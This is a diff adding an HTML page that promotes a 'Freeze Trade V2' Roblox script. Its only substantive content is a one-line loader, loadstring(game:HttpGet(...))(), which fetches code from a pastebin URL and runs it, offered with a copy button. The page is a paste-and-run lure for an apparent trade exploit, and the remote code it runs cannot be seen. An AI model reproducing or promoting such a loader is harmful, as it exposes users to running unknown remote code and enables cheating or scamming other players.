@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Freeze Trade V2 – 100% Working</title>
+
+<style>
+body {
+    margin: 0;
+    font-family: Arial, sans-serif;
+    background: linear-gradient(135deg, #0f172a, #1e293b);
+    color: white;
+    text-align: center;
+}
+
+header {
+    padding: 30px;
+    font-size: 32px;
+    font-weight: bold;
+    color: #38bdf8;
+}
+
+.container {
+    margin-top: 50px;
+}
+
+.box {
+    background: #1e293b;
+    padding: 25px;
+    border-radius: 15px;
+    width: 60%;
+    margin: auto;
+    box-shadow: 0 0 20px rgba(0,0,0,0.5);
+}
+
+.script {
+    background: #0f172a;
+    padding: 15px;
+    border-radius: 10px;
+    margin-top: 15px;
+    word-break: break-all;
+}
+
+button {
+    margin-top: 15px;
+    padding: 10px 20px;
+    border: none;
+    border-radius: 10px;
+    background: #38bdf8;
+    color: black;
+    font-weight: bold;
+    cursor: pointer;
+}
+
+button:hover {
+    background: #0ea5e9;
+}
+
+img {
+    width: 200px;
+    margin-top: 20px;
+    border-radius: 10px;
+}
+</style>
+</head>
+
+<body>
+
+<header>🔥 Freeze Trade V2 – 100% Working 🔥</header>
+
+<div class="container">
+    <div class="box">
+        <h2>Freeze Trade V2</h2>
+        <p>Powerful Roblox Script – Abraham Roger Style</p>
+
+        <!-- Roblox Image -->
+        <img src="https://tr.rbxcdn.com/180DAY-Avatar-Placeholder.png" alt="Roblox Image">
+
+        <!-- Script -->
+        <div class="script" id="script">
+loadstring(game:HttpGet("https://pastebin.com/raw/XXRrP5uD"))()
+        </div>
+
+        <!-- Copy Button -->
+        <button onclick="copyScript()">📋 Copy Script</button>
+    </div>
+</div>
+
+<script>
+function copyScript() {
+    const text = document.getElementById("script").innerText;
+    navigator.clipboard.writeText(text);
+    alert("Script copied!");
+}
+</script>
+
+</body>
+</html>
